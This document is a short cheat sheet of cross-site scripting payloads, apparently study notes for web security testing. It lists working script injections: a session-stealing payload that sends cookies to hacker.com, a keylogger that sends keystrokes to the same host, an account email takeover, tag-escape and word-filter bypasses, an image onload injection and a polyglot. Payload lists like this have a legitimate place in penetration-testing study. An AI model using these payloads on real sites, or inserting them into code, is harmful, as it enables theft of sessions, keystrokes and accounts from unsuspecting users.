* POC:
`<script>alert('XSS');</script>`

* Session stealing:
`<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>`

* Key Logger:
`<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>`

* Business Logic:
`<script>user.changeEmail('attacker@hacker.com');</script>`

* Escaping a value insid a tag (i.e., <h2><input value="value">takeabreath</h2>
`"><script>alert('1')</script>`

* Word Filter bypass:
`<sscriptcript>alert('1');</sscriptcript>`

* img source tag:
`/images/cat.jpg" onload="alert('1');`

* Polyglot
`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('1') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('1')//>\x3e`
